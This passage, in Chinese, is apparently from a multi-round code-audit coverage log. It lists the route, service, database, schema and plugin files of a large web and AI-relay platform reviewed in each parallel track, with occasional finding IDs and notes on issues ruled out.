- 鉴权授权：`auth.ts`、`auth-extended.ts`、`auth-identity.ts`、`auth-carrier.ts`、`auth-codes.ts`、`auth-passkey.ts`、`auth-sso.ts`、`mfa.ts`、`security.ts`、`user-security-routes.ts`、`user/ip-whitelist-guard.ts`、`rbac.ts`、`oauth-authorization-server.ts`、`oauth-keys.ts`、`oauth-register.ts`、`oauth-tokens.ts`、`member.ts`、`teams.ts`、`organization.ts`、`tenant.ts`、`workspace-permissions.ts`、`user/member-routes.ts`；`plugins/auth.ts`、`internal-secret-auth.ts`、`internal-service-ticket.ts`、`mtls.ts`、`network-segment.ts`、`lazy-admin-guard.ts`、`tenant-db-isolation.ts`、`csrf.ts`。
- 资金积分：`wallet.ts`、`finance.ts`、`user/fund-routes.ts`、`earnings-routes.ts`、`user/withdrawal-routes.ts`、`order.ts`、`points-mall-user.ts`、`gamification.ts`、`live-gifts.ts`、`rewarded-video-ad.ts`、`tbox-points.ts`、`user/payment-routes.ts`、`distribution.ts`、`refund-audit.ts`、`billing.ts`、`credits-usage.ts`、`tbox.ts`；`db/fund-queries.ts`、`order-queries.ts`、`commission-queries.ts`、`gamification-queries.ts`、`billing-queries.ts`。
- 输入面：`share-content.ts`、`url-preview.ts`、`embed-proxy.ts`、`n8n-proxy.ts`、`checkin-proxy.ts`、`ai-skills-proxy.ts`、`ai-marking-proxy.ts`、`oss.ts`、`downloads.ts`、`resource.ts`、`legacy-oss.ts`、`other/oss-resource-routes.ts`、`file-version.ts`、`github-webhook.ts`、`webhooks.ts`、`webhooks-trigger.ts`、`sms-callback.ts`、`callback-log.ts`、`developer/webhooks.ts`、`cli-import.ts`、`gen-table.ts`、`other/pdf-routes.ts`、`other/image-gen-routes.ts`；`plugins/upload-scanner.ts`、`sqli-guard.ts`、`xss-protection.ts`、`prompt-injection-guard.ts`、`http-conn-guard.ts`。
- DB 查询层：`order-queries`、`fund-queries`、`commission-queries`、`gamification-queries`、`billing-queries`、`knowledge-queries`、`live-queries`、`member-queries`、`member-extended-queries`、`rbac-queries`、`agent-queries`、`agents-queries`、`agent-chat-queries`、`agent-team-queries`、`resource-queries`、`workflow-queries`、`workspace-queries`、`workspace-permission-queries`、`certificate-queries`、`sms-receive-queries`、`oauth-token-queries`、`security-logs-queries`、`statistics-queries`、`sql-event-bus`。
- v1/worker：`v1-responses`、`v1-messages`、`v1-gemini`、`v1-realtime`、`v1-batches`、`v1-midjourney`、`v1-rerank-moderations`、`v1-codebase-search`、`v1-apply-diff`、`v1-protocol-*`、`v1-shared`、`v1-public`、`v1-ai-core`、`v1-knowledge-tools`；`ai-vendors/proxy-openai-compat`、`proxy-media`、`proxy-tools`、`luyala`、`_shared`；`workers/batch-worker`、`ai-callback-worker`、`notification-dispatch-worker`、`notification-worker`、`registry-sync-worker`、`relay-health-check-worker`、`usdt-payment-worker`；`queue/batch-queue`、`plugins/queue`。

### 第五轮覆盖（四路并行）
- user 路由面（21 文件）：`routes/user/_shared.ts`、`proxy-routes.ts`、`ai-models-routes.ts`、`member-routes.ts`、`fund-routes.ts`、`withdrawal-routes.ts`、`payment-routes.ts`、`ip-whitelist-guard.ts`、`knowledge*`、`notification*`、`article*`、`ai-capabilities*`、`skills*`、`career*`、`orders*`、`files*` 等 `routes/user/*`。
- ai 路由面（16 文件）：`routes/ai-frontend-routes.ts`、`ai-image-edit.ts`、`ai-audio.ts`、`ai-video-compose.ts`、`ai-image*`、`ai-generation*`、`ai-mcp*`、`ai-model*`、`ai-career-advice`、`ai-callback*`、`ai-skills*`、`ai-vendors/proxy-extended*`、`proxy-media`、`proxy-tools`。
- WS/SSE 面（13 插件）：`plugins/ws-customer-service.ts`、`ws-ai.ts`、`ws-payment.ts`、`ws-chat.ts`、`ws-notifications.ts`、`ws-*.ts`、`plugins/sse-*`。
- jobs 与上游面（9 文件）：`jobs/ai-world-sync.ts`、`hot-words-sync.ts`、`audit-evidence-retention.ts`、`jobs/*` 其余定时任务、`routes/ai-vendors/proxy-tools.ts`、`proxy-openai-compat.ts`。

### 第六轮覆盖（五路并行）
- admin 面：`routes/admin.ts`、`admin-sys/{index,_shared,_audit-hook,user-routes,role-routes,config-routes,online-routes,operlog-routes}.ts`、`admin/_shared.ts`、`admin/{member-users,auth-accounts,system-operation-logs,redemption-codes,coupons,export-csv,user-roles,auth-role,role-permissions,auth-tokens,auth-user-vip,user-billing-groups,topup-config,developer-link,member-permissions,user-agent-image,task-developer,stats,webhook-debug,ai-gc,zhs-identity}.ts`、`admin-extended/{user-routes,order-routes,role-routes,index,_shared}.ts`、`admin-extended.ts`、`admin-zone.ts`、`admin-missing-routes.ts`、`admin-invoices.ts`、`admin-saas-proxy.ts`、`admin-sms.ts`、`admin-monitoring-routes.ts`。
- 顶层 agent/AI：`agent-extended.ts`、`agent-runs/agent-runtime/agent-team/agent-canvas/agent-langgraph/agentic-service/agent-reviews/agents-kanban`、`ai-extended/ai-generation/ai-callback/ai-pricing/ai-tutor-routes/ai-education/ai-grading/ai-user-model-chat/ai-world`、`coze*/clawdbot/openclaw-routes/mcp-extended/orchestration/subagent-dispatch/subagents-extended-routes/super-agent/crew/chat-collab/conversation-import/team-memory/meta-learner/engine-control-frames/engine-voice`；关联 `apps/ai-service/app/{main.py,core/jwt_auth.py,routers/orchestration.py}`。
- services 面：`knowledge-rag-service`、`knowledge-chat-context`、`embedding-provider`、`document-parser`、`knowledge-team-service`、`relay-conversation-service`、`storage-service`、`oss-sts-service`、`tencent-live-service`、`markdown-converter-service`、`workbook-service`、`transcode-service`、`pdf-service`、`srs-service`、`srs-review-service`、`sms-notify`、`push-provider`、`cache-warmup-service`、`cleanup-service`、`scheduled-tasks-service`、`account-lockout-service`、`mfa-service`、`relay-account-pool-scheduler`、`repo-wiki-service`、`excel-export-service`、`upload-merge-gate`。
- utils/db/schema：utils 15 个有状态模块（含 `ssrf-guard`、`pessimistic-lock`、`distributed-lock`、`sse-replay-buffer`、`sse-stream-registry`、`proxy-dispatcher`、`dead-letter-queue`、`money`、`positive-int`、`timezone-utils`、`internal-jwt`）、lib 全 3 个、db 约 19 个（`plugin-events`、`comment`、`learn-extended`、`learn-record`、`vip`、`exchange-rate`、`developer`、`admin`、`registry`、`social`、`queries` 等）、schema 12 个资金/权益/幂等相关表与 `drizzle/*.sql` 索引核对。
- other/user 剩余：`routes/other/*` 26 个、`routes/user/*` 19 个、`community/*` 5 个、`developer/*` 2 个、`learn/get-lesson-video.ts`、`ws/live-chat.ts`。

### 第七轮覆盖（五路并行）
- admin：`admin/relay-account-pool.ts`、`relay-api-keys.ts`、`relay-capacity.ts`、`relay-channels.ts`、`relay-commission.ts`、`relay-data-management.ts`、`relay-enterprise.ts`、`relay-key-pool.ts`、`relay-key-scheduling.ts`、`relay-logs.ts`、`relay-peak-pricing.ts`、`relay-pricing.ts`、`relay-switch-admin.ts`；`admin-sys/job-routes.ts`、`job-log-routes.ts`、`index.ts`；`admin/tool/gen.ts`、`gen-post.ts`；`admin/oss-files.ts`；`admin-missing-routes.ts`。
- miniapp/edu/legacy：`miniapp-compat-routes.ts`（定向段）、`miniapp-public-fallback-routes.ts`、`mobile-chat-routes.ts`、`self-media-routes.ts`、`circle-mobile-routes.ts`、`course-mobile-routes.ts`、`zhs-legacy.ts`、`zhs-organization.ts`、`legacy-*.ts`（10 个）、`learn.ts`、`teacher.ts`、`exam.ts`、`edu-frontend-routes.ts`、`edu-public.ts`、`edu-supplementary-routes.ts`、`edu-canteen.ts`、`edu-extended.ts`、`edu-ai-management.ts`（鉴权面）。
- db 剩余：`content-queries`、`news-queries`、`visit-tracking-queries`、`notification-queries`、`team-queries`、`skills-queries`、`mcp-queries`、`openclaw-queries`、`schedule-queries`、`mobile-stats-queries`、`behavior-queries`、`social-queries`、`private-letters-admin-queries`、`voice-note-queries`、`resource-likes-queries`、`export-tasks-queries`、`content-generation-queries`、`topic-queries`、`agreements-queries`、`sensitive-words-queries`、`captcha-queries`、`id-mapping-queries`、`exam-queries`、`community-queries`、`ai-feed-post-queries`。
- relay 池/短信/转码：`relay-account-pool-service`、`relay-account-forwarder`、`relay-channel-router`、`relay-commission-service`、`relay-enterprise-service`、`relay-response-cache`、`relay-proxy-pool`、`relay-outbound-proxy`、`channel-quota-service`、`sms.ts`、`sms-callback-parse`、`sms-compliance`、`backup-jobs-service`、`data-archive-service`、`transcode-service`、`srs-service`。
- MCP/OpenClaw/Key：`api-key-shares.ts`、`api-key-share-service.ts`、`plugins/api-key-auth.ts`（分享段）、`openclaw-routes.ts`、`llm-verify-key.ts`、`user-llm-configs.ts`、`user-llm-configs-v2.ts`、`llm-models.ts`、`sdks.ts`、`skill-categories.ts`、`plugins.ts`、`tools.ts`、`hooks.ts`、`skills.ts`、`mcp-extended.ts`（基线版）。

### 第八轮覆盖（五路并行）
- chat / v1 协议：`routes/v1-protocol-completeness.ts`（fine_tuning 全段）、`routes/v1-ai-core.ts`、`routes/chat-models.ts`（multi/vendors/all-models 段）、`routes/v1-assistants.ts`（threads/runs）、`routes/v1-public.ts`（chat/completions 计费段）、`utils/ai-service-fetch.ts`；对照 `apps/ai-service/app/core/{jwt_auth,config}.py`。
- files / oss / live / transcode：`routes/srs.ts`、`services/srs-service.ts`、`routes/other/oss-resource-routes.ts`、`routes/chunked-upload.ts`、`services/transcode-service.ts`、`routes/live-gifts.ts`、`schema/{srs,live-extended}.ts`。
- chat / workspace 服务：`services/crew-orchestrator.ts`、`services/crew-tools.ts`、`services/crew-llm-adapter.ts`、`plugins/ai-cost.ts`（crew 段）、`services/workspace-lock.ts`、`services/workspace-lock-heartbeat.ts`、`routes/agents-kanban.ts`、`services/subagent-dispatch-service.ts`、`routes/subagent-dispatch.ts`、`routes/crew.ts`。
- plugins：`plugins/point-aspect.ts`、`routes/social.ts`、`db/social-queries.ts`、`db/point-queries.ts`、`plugins/watch-aspect.ts`、`routes/resource.ts`、`db/resource-queries.ts`、`routes/news.ts`、`plugins/audit-logger.ts`、`plugins/http-conn-guard.ts`、`plugins/distributed-rate-limit.ts`、`plugins/tenant.ts`、`routes/ai-user-model-chat.ts`。
- miniapp / edu 剩余：`routes/miniapp-compat-routes.ts`（messages/rooms、notification preferences、learn/video/log 段）、`routes/edu-ai-management.ts`（attendance、parent/children 段）、`routes/edu-ai-management-attendance-helpers.ts`。

### 第九轮覆盖（五路并行）
- utils 安全与一致性：`ssrf-guard.ts`、`relay-egress-guard.ts`、`scoped-guard.ts`、`capability-guard.ts`、`open-capability-gate.ts`、`follower-guard.ts`、`public-asset-fetch.ts`、`file-transfer.ts`、`file-type-validator.ts`、`utf8-bound.ts`、`crypto.ts`、`crypto-extra.ts`、`crypto-random.ts`、`password-crypto.ts`、`api-key-{credential,hash,presence,quota}.ts`、`optimistic-lock.ts`、`pessimistic-lock.ts`、`distributed-lock.ts`、`deadlock-retry.ts`、`outbox.ts`、`refund-dlq.ts`、`dead-letter-queue.ts`、`window-counter.ts`、`bloom-guard.ts`、`cache-avalanche-guard.ts`、`bot-detection.ts`、`auth-cookies.ts`、`csrf-exempt-credential.ts`、`internal-{jwt,principal,call-headers}.ts`、`system-access-token.ts`、`upstream-auth.ts`、`login-verify.ts`、`phone.ts`、`uuid.ts`、`like-escape.ts`、`parse-boolean.ts`、`positive-int.ts`、`paging.ts`、`biz-day.ts`、`timezone-utils.ts`、`calendar-boundary.ts`、`money.ts`。
- plugins：`anti-automation.ts`、`rate-limit-failsafe-store.ts`、`cache-resilience.ts`、`scheduler.ts`、`redis.ts`、`open-idempotency.ts`、`payment-idempotency.ts`、`rls-context.ts`、`require-permission.ts`、`internal-secret-auth.ts`、`internal-service-ticket.ts`、`sse-registry.ts`、`terminal-cleanup.ts`、`terminal-ws.ts`、`slow-sql-killer.ts`、`db-keepalive.ts`、`ws-{helpers,guard,messages,tasks,relay-ops}.ts`、`threat-detector.ts`、`business-metrics.ts`（指标写入段）、`canary-router.ts`、`cors-origin.ts`。
- services 运营/通知/财务：`alert-check-service.ts`、`alert-notification-service.ts`、`broadcast-email-service.ts`、`email-service.ts`、`sms.ts`、`sms-notify.ts`、`sms-tencent.ts`、`sms-review-status.ts`、`wechat-subscribe-message.ts`、`scheduled-tasks-service.ts`、`cleanup-service.ts`、`cache-warmup-service.ts`、`backup-jobs-service.ts`、`data-archive-service.ts`、`expiration-monitor-service.ts`、`vip-expire-service.ts`、`plan-entitlement-service.ts`、`subscription-service.ts`、`subscription-window-service.ts`、`settlement-service.ts`、`commission-service.ts`、`commission-settle-service.ts`、`reconciliation-service.ts`、`credits-usage-service.ts`、`points-service.ts`、`redemption-code-service.ts`、`risk-engine-service.ts`。
- services relay/供应商/基础设施：`relay-session-sync-*.ts`、`relay-stop-truncate.ts`、`relay-user-attributes-service.ts`、`relay-model-catalog.ts`、`relay-account-pool-{credential,reauth,reconcile,scheduler}.ts`、`relay-account-shared-state.ts`、`relay-plugins-service.ts`、`relay-param-ops*.ts`、`relay-pool-policy.ts`、`relay-task-center.ts`、`relay-pool-stats-service.ts`、`relay-local-login.ts`、`relay-account-usage.ts`、`relay-queue-name.ts`、`relay-error-rules-service.ts`、`relay-insights-service.ts`、`relay-alert-rules-service.ts`、`relay-health-check-service.ts`、`relay-account-pool-checkin-sync.ts`、`api-key-{share,group,tpm}-service.ts`、`developer-api-keys-service.ts`、`key-rate-window-service.ts`、`user-rate-limit.ts`、`user-concurrency-service.ts`、`vendor-{auth-strategies,caller-service,error-handler}.ts`、`model-mapping-service.ts`、`litellm-price-sync.ts`、`terminal-service.ts`。
- db 剩余：`admin-queries.ts`、`ai-world-queries.ts`、`analytics-queries.ts`、`audit-queries.ts`、`authorizations-queries.ts`、`background-context.ts`、`chat-*.ts`、`coze-chat-queries.ts`、`customer-service-queries.ts`、`developer-queries.ts`、`element-pack-queries.ts`、`exchange-rate-queries.ts`、`file-queries.ts`、`live-calendar-queries.ts`、`message-queries.ts`、`misc-{extended-,}queries.ts`、`my-member-queries.ts`、`oauth-queries.ts`、`oss-queries.ts`、`payment-queries.ts`、`point-queries.ts`、`promotion-queries.ts`、`queries.ts`、`registry-queries.ts`、`search-queries.ts`、`setting-queries.ts`、`site-categories-queries.ts`、`sql-event-bus.ts`、`system-queries.ts`、`user-preferences-queries.ts`、`usercenter-queries.ts`、`video-task-queries.ts`、`vip-queries.ts`、`ai-modules-queries.ts`。

### 第十轮覆盖（五路并行）
- A 路 services/智能体与自动化：`agent-automation-scheduler.ts`、`context-engine-service.ts`、`subagent-dispatch-service.ts`（二次深挖）、`relay-enterprise-service.ts`、`super-agent-pump-service.ts`、`run-idempotency.ts`、`utils/ai-service-fetch.ts`。
- B 路 services/文档·教育·上传：`xlsx-parser.ts`、`diff-service.ts`、`heat-stats-service.ts`、`edu-attendance-rule.ts`、`search-es-service.ts`、`workbook-service.ts`、`upload-merge-redis-semaphore.ts`、`self-healing.ts`、`workspace-ai-service.ts`。
- C 路 services/账号·认证·审计·风控：`refresh-replay-policy.ts`、`purge-user-pii.ts`、`coze-auth-utils.ts`、`oauth-providers.ts`、`geoip.ts`、`audit-log-service.ts`、`db/audit-queries.ts`、`routes/auth-extended.ts`（token 旋转/重放段）。
- D 路 routes 剩余与上游代理：`v1-multimodal.ts`、`tencent-hunyuan-3d.ts`、`v1-midjourney.ts`、`v1-rerank-moderations.ts`、`workspace-ai.ts`、`v1-public.ts`（批量/异步段）、`workspace.ts`、`live.ts`、`oss.ts`、`files.ts`。
- E 路 utils 剩余：`logger.ts`、`redact-credential-text.ts`、`index.ts`、`ws-dedup.ts`、`ws-rate-limit.ts`、`ws-replay-buffer.ts`、`sse-state-store.ts`、`sse-stream-registry.ts`、`code-echo-guard.ts`、`csv-utils.ts`、`public-edge-cache.ts`、`sse-replay-buffer.ts`。

### 第十一轮覆盖（五路并行）
- A 路 v1 协议逐 handler：`routes/v1-messages.ts`、`routes/v1-responses.ts`、`routes/chat.ts`（全部端点）、`routes/chat-collab.ts`（floor 锁）、`db/chat-queries.ts`（createMessage/regenerate/editAiMessageAsVersion/editMessageAndTruncateAfter/rollHistoryProjection）、`db/chat-collab-write-queries.ts`、`plugins/api-key-auth.ts`、`utils/api-key-quota.ts`、`services/anthropic-adapter.ts`、`services/relay-billing-service.ts`（recordCall/isByokCall）、`services/relay-param-ops-config.ts`；上游对照 `apps/ai-service/app/routers/llm.py`、`app/core/llm_gateway.py`。
- B 路 chat 账本与 workspace-ai：`services/chat-ledger-store.ts`、`services/message-permission-stamp.ts`、`services/session-quality-stats-service.ts`、`services/workspace-ai-service.ts`（深挖：agent 循环/权限/沙箱/routine/调度器）、`routes/ai-chat-stream.ts`、`routes/ai-callback.ts`、`routes/mobile-chat-routes.ts`、`routes/workspace-ai.ts`、`routes/user/chat-ledger-routes.ts`、`routes/admin-ops-wallboard.ts`、`index.ts`、`worker-entry.ts`、`schema/chat-ledger.ts`、`schema/visit-tracking.ts`。
- C 路 适配器/定价/券/认证：`services/anthropic-adapter.ts`、`gemini-protocol.ts`、`provider-models.ts`、`pricing-engine.ts`、`pricing-service.ts`、`tiered-pricing-service.ts`、`peak-pricing-service.ts`、`coupon-service.ts`、`email-service.ts`、`email-templates.ts`（origin/main 版）、`email-assets.ts`、`broadcast-email-service.ts`、`mail-relay-notifier.ts`、`push-provider.ts`、`captcha-service.ts`、`captcha.ts`、`totp-service.ts`、`device-service.ts`、`carrier-login.ts`、`login-anomaly-notifier.ts`、`login-hash-upgrade.ts`、`login-region.ts`、`qr-login-agreement.ts`。
- D 路 教育账本/学习/统计：`services/edu-ledger.ts`、`edu-arrear-remind-service.ts`、`edu-attendance-absent-job.ts`、`edu-schedule-conflict.ts`、`audience-stats-service.ts`、`engagement-stats-service.ts`、`download-stats-service.ts`、`traffic-stats-service.ts`、`page-dwell-stats-service.ts`、`visit-source-stats-service.ts`、`visit-transition-stats-service.ts`、`crash-report-service.ts`、`patrol-scheduler.ts`；`db/edu-extended-queries.ts`、`learn-queries.ts`、`learn-extended-queries.ts`、`learn-record-queries.ts`、`exam-queries.ts`、`exam-extended-queries.ts`、`schedule-queries.ts`；对照 `routes/edu-ai-management.ts`、`edu-ai-management-schemas-extended.ts`、`services/order-service.ts`、schema `edu-ai-management.ts`/`learn-record.ts`/`exam.ts`。
- E 路 utils 基建（22/22 全读）：`data-quality-monitor.ts`、`db-failover.ts`、`dispatch-ownership.ts`、`dispatch-status.ts`、`egress-retry-safety.ts`、`elapsed-ms.ts`、`hot-config.ts`、`inference-metrics.ts`、`kill-verified.ts`、`latency-persistence.ts`、`legacy-device-fingerprint.ts`、`metric-cardinality.ts`、`openapi-helpers.ts`、`platform-templates.ts`、`pool-leak-detector.ts`、`process-probe.ts`、`retired-providers.ts`、`ryw-consistency.ts`、`shutdown-phases.ts`、`sla-calculator.ts`、`swagger.ts`、`ttft-monitor.ts`；连带 `db/index.ts`、`plugins/db-keepalive.ts`、`plugins/business-metrics.ts`、`routes/webhooks-trigger.ts`、`services/self-healing.ts`、`node_modules/.pnpm/postgres@3.4.9`。
- 本轮负结论（避免后续重复）：`gemini-protocol.ts` 工具能力为显式不支持；`email-templates.ts`（origin/main）title/nickname/content 均转义，无 HTML 注入；`pricing-engine.ts` 时区与向下取整正确；`startPatrolScheduler` 有 timer 单例守卫；`edu_payment_record.receipt_no` 唯一索引可挡并发重复回调。

### 第十二轮覆盖（五路并行）
- A 路 路由剩余：`routes/community.ts`、`routes/community/{circles,posts,asks,topics}.ts`；`routes/other/` 全部 23 个子路由（`index`、`_shared`、`knowledge-base`、`developer`、`member`、`share`、`service-appointment`、`student-profile`、`study-plan`、`tour`、`recruitment`、`notes`、`message`、`activity`、`history`、`notification`、`ai-world`、`ai-capability`、`address`、`audit`、`v1-tools`、`v1-content`、`llm-stream`）；`routes/admin-shop-routes.ts`、`admin-saas-proxy.ts`、`admin-exchange-rate.ts`；`routes/chunked-upload.ts`、`routes/downloads.ts`、`routes/v1-public.ts`（files/chat 分支）；`routes/developer/api-key-groups.ts`。
- B 路 relay 与统计：`services/relay-pool-stats-service.ts`、`relay-account-usage.ts`、`relay-upstream-forwarder.ts`、`relay-health-check-service.ts`、`relay-alert-rules-service.ts`、`relay-pool-policy.ts`、`relay-account-pool-credential.ts`、`relay-ops-snapshot.ts`、`relay-session-sync-*.ts`、`relay-stop-truncate.ts`、`relay-live-probe.ts`、`relay-local-login.ts`、`relay-plugins-service.ts`、`relay-prompt-audit-service.ts`、`relay-user-attributes-service.ts`、`audit-export-key-registry.ts`、`audit-service.ts`、`download-stats-service.ts`、`traffic-stats-service.ts`、`visit-transition-stats-service.ts`、`crash-report-service.ts`。
- C 路 智能体与 registry：`services/agent-service.ts`、`agent-team-service.ts`、`agent-task-status.ts`、`agent-sse-bus.ts`、`agent-event-trigger.ts`、`agent-automation-scheduler.ts`、`agent-runtime-stream.ts`、`agent-runtime/session-store.ts`、`ai-feed-service.ts`、`ai-vendor-config-service.ts`、`ai-cost-tracker.ts`、`webhook-{github-dispatch,notifier,relay-notifier}.ts`、`scheduled-tasks-service.ts`、`relay-task-center.ts`、`ai/` 下 7 个服务、`registry-sync/` 全部 7 个文件；`routes/github-webhook.ts`、`agent-team.ts`、`ai-feed.ts`、`ai-generation.ts`、`agent-extended.ts`、`workers/registry-sync-worker.ts`；上游 `apps/ai-service/app/routers/agents.py`。
- D 路 db 与 schema：`db/{content-generation,element-pack,authorizations,video-task,my-member,misc,misc-extended,promotion,oauth,usercenter,vip,payment,point,billing,gamification,commission,oauth-token,order}-queries.ts`；schema `point/commission/promotions/coupons/billing/funds/wallet/audit/relay-usage/payment-callbacks/developer-api-keys/oauth/chat/news/users/misc-extended/misc-extended-2/zhs-full`；迁移 `20261106150000_fix_missing_indexes_fks.sql`、`0208_careless_prism.sql`。
- E 路 横切三项：(1) `buildSchema` 全量 236 个调用点括号解析 —— 227 个未传 `response`，其中仅 F-323 的 2 个文件返回顶层数组，**零新增**；(2) 模块级 `setInterval/startScheduler` —— 新增 F-367/F-368 两条（均为进程内清理器，无重复业务）；(3) 权限矩阵抽查 `agents.ts`/`agent-extended.ts`/`workspace-ai.ts` —— 新增 F-359 ~ F-366 八条。

### 第十三轮覆盖（五路并行）
- A 路资金与订阅：`services/api-subscription-service.ts`（全量）、`services/order-service.ts`（退款段 600-700）、`routes/payment-gateway.ts`（退款 1250-1400）、`services/budget-alert-service.ts`、`plugins/ai-cost.ts`（成本累计段）、`services/user-billing-group-service.ts`、`schema/billing.ts`（到期/订阅列）、`schema/ai-cost.ts`。
- B 路风控/上传/存储：`services/risk-engine-service.ts`（全量规则表 60-420）、`routes/auth.ts`（登录/注册风控调用点 600-1100）、`routes/chunked-upload.ts`（begin/part/merge/cancel 全段）、`services/upload-integrity.ts`（全量）、`services/storage-service.ts`（OSS 分片会话 600-760）、`services/upload-merge-gate.ts`。
- C 路知识库/RAG/映射：`services/knowledge-team-service.ts`、`db/team-queries.ts`、`services/model-mapping-service.ts`、`plugins/api-key-auth.ts`（模型校验 900-1000）、`routes/v1-public.ts`（1620-1680、2080-2130）、`services/knowledge-chat-context.ts`、`routes/ai-chat-stream.ts`（知识注入段）、`plugins/prompt-injection-guard.ts`、`services/knowledge-rag-service.ts`、`routes/knowledge-rag.ts`、`services/provider-models.ts`。
- D 路剩余路由：`routes/spec.ts`、`services/spec-service.ts`（读写/提交段）、`routes/developer-relay.ts`（Key 创建/充值/兑换）、`routes/developer-relay-bootstrap.ts`、`routes/admin-content-routes.ts`、`routes/admin-shop-routes.ts`、`routes/developer.ts`（token 统计段）、`services/relay-billing-service.ts`（1534-1541 写点）、`services/redemption-code-service.ts`、`db/exchange-rate-queries.ts`、`schema/zhs-full.ts`（汇率表）。
- E 路 schema 与权限矩阵：`schema/api-key-groups.ts` + `services/api-key-group-service.ts`（upsert 段）、`routes/payment-recurring.ts`（回调验签全段）、`server.ts`（rawBody 注册 520-560）、`routes/workspace-ai.ts`（computer-use 1200-1400、swarms 960-1040）、`services/workspace-ai-service.ts`（对应实现段）、`routes/admin-sys/role-routes.ts`、`db/admin-sys-queries.ts`（角色删除 160-190）。
- 本轮主代理二次复核：F-369（`api-subscription-service.ts:377-423` 实读）、F-381（`upload-integrity.ts:250-313` + `chunked-upload.ts:150-190,289-301,470-570` 实读）、F-399（`payment-recurring.ts:436-470` 实读）、F-400（`workspace-ai.ts:1205-1280` 实读）。
- 本轮负结论（避免后续重复）：`chunked-upload` 的 begin 处预算按**单用户活跃会话数**判定（`:166-190`），与全局字节预算（`:289-301`）是两条独立档，不存在“单用户无限开会话”问题；`payment-recurring` 已有报文级 nonce 去重（`:467-477`）。

### 第十四轮覆盖（五路并行）
- A 路资金闭环：`services/points-service.ts`、`commission-service.ts`、`commission-settle-service.ts`、`vip-expire-service.ts`、`channel-quota-service.ts`（380-500）；`db/commission-queries.ts`（1-136、360-700）、`gamification-queries.ts`（180-410）、`vip-queries.ts`（100-140）、`order-queries.ts`（380-550）；`routes/payment-gateway.ts`（700-757、1190-1280、1500-1540、1650-1690）、`payment-extended.ts`（95-215）、`admin-shop-routes.ts`、`user/withdrawal-routes.ts`、`finance.ts`（313-354）、`finance-extended.ts`（522-645）、`distribution.ts`（398-451）、`developer.ts`（660-835）、`points-mall-user.ts`、`points-tasks.ts`、`gamification.ts`、`auth.ts`（680-740）、`admin-invoices.ts`、`refund-audit.ts`、`admin/relay-enterprise.ts`、`order-service.ts`（240-480、600-680）、`workers/scheduler-worker.ts`（465-525）。
- B 路媒体文档向量：`services/embedding-provider.ts`、`video-sign.ts`、`document-parser.ts`、`xlsx-parser.ts`、`workbook-service.ts`、`markdown-converter-service.ts`、`storage-service.ts`（全文）；`routes/files.ts:40-70,150-230,380-492`、`routes/workbook.ts`（全）、`server.ts:718-742`、`knowledge-rag-service.ts:50-90,165-206`、`codebase-index-service.ts:170-250`、`db/file-queries.ts:22-40`。目录实测：无 `media-*`/`image-*`/`ppt-*`/`doc-*`/`translate-*`/`ocr-*`/`vector-*.ts`。
- C 路 clawdbot/生成队列：`services/permission-grants.ts`、`ai/generation-queue-service.ts`、`qoder-bridge-client.ts`、`tool-invocation-ledger-service.ts`、`tool-approval-audit.ts`、`runtime-import-plan.ts`、`code-generator.ts`、`codebase-index-service.ts`、`siem-exporter.ts`、`org-policy-service.ts`、`two-factor-step-up-store.ts`、`token-service.ts`、`im-outbound-policy.ts`、`vip-expire-service.ts`、`stock-service.ts`、`team-memory-service.ts`、`raw-retention-optout.ts`；`services/clawdbot/` 16 个（`tool-executor`、`tools`、`permission-guard`、`safe-condition`、`system`、`task-executor`、`mcp`、`skills`、`nodes`、`gateway`、`memory`、`pairing`、`session-manager`、`message-processor`、`canvas`、`clawdbot-service`）；`routes/clawdbot.ts`、`tools.ts`、`ai-generation.ts`、`agent-control.ts`、`stock.ts`、`v1-codebase-search.ts`、`internal-tool-invocation-ledger.ts`；`schema/tool.ts`。
- D 路剩余路由：`routes/developer.ts`（1-1146 分段全文）、`admin-api-platform.ts`（全）、`admin-content-routes.ts`（全）、`workspace.ts`（1-885 全段）、`workspace-permissions.ts`、`workspace-attribution.ts`、`agent-langgraph.ts`、`ws/live-chat.ts`、`v1-public.ts`（116-226、1093-1513、2155-2524）、`services/langgraph-proxy.ts`、`plugins/require-permission.ts`、`db/workspace-queries.ts`、`utils/file-type-validator.ts`。
- E 路 db/schema：`db/misc-extended-queries.ts`、`admin-queries.ts`、`admin-sys-queries.ts`（1-1182）；schema `tool-invocation-ledger`、`chat-ledger`、`agent-teams`、`customer-service`、`commission`、`relay-usage`、`payment-callbacks`、`relay-alert-rules`、`relay-alert-silences`、`relay-error-rules`、`relay-peak-pricing`、`key-rate-window-counts`、`relay-user-attributes`、`relay-commission-records`；对照迁移 24 个（含 `0043`、`20261024020000`、`20261106150000`）。
- 本轮主代理二次复核：F-404（`payment-gateway.ts:720-760` + `commission-service.ts:115-160`）、F-405（`finance-extended.ts:552-600` + `payment-extended.ts:140-180`）、F-433（`tool-invocation-ledger.ts:60-100`）。
- 本轮负结论：`routes/upload*.ts` 不存在（上传逻辑内联在 `workspace.ts`/`v1-public.ts`）；`db/payment-callbacks-queries.ts`、`db/relay-usage-queries.ts` 全仓 0 命中（仅 schema 有表定义）；`v1-public.ts:227-1092`、`1514-2154` 为 chat/completions/batches 段，前轮 F-191/F-345 已覆盖。

### 第十五轮覆盖（五路并行）
- A 路 AI 长尾：`services/ai/` 下 `ai-capability-analytics/discovery/documentation/marketplace/templates/testing`、`cognitive-intelligence`、`plot-advisor-service`、`prompt-optimizer-service`、`video-quality-analyzer`（全量）；`services/clawdbot/` 下 `analytics`、`bot-manager`、`browser`、`channels`、`health`、`integrations`、`logger`、`message-router`、`models`、`self-evolution`、`state-machine`、`voice`（全量）；辅助 `routes/drama.ts`、`routes/clawdbot.ts`、`services/crew-llm-adapter.ts`。
- B 路 v1-public/workspace-ai：`routes/v1-public.ts`（98-260、407-975、1097-1315、1490-2523）、`routes/v1-batches.ts`（180-380）、`routes/workspace-ai.ts`（338-478、826-1005、1028-1202、1360-1460、1646-1805）、`routes/admin-extended/*` 14 个子路由、`services/workspace-ai-service.ts`（3360-3440）、`services/relay-billing-service.ts`（1062-1180）。
- C 路 schema 模式化：`packages/database/src/schema/**` 全量 Grep + 重点文件逐行；`drizzle/0035/0036/0043/0044`、`20260831`、`20261024`、`20261102/04/06/07` 系列与 `meta/_journal.json`。
- D 路 事务嵌套：Grep `db.transaction` 命中 57 文件约 120 处，精读生产事务块 50+（payment-recurring、order-service、payment/order/commission/relay/edu/points/channel-quota/coupon/redemption/wallet/live-gifts/developer/finance/admin-shop/token-balance/chat/social/rbac/theme/ab-testing）。
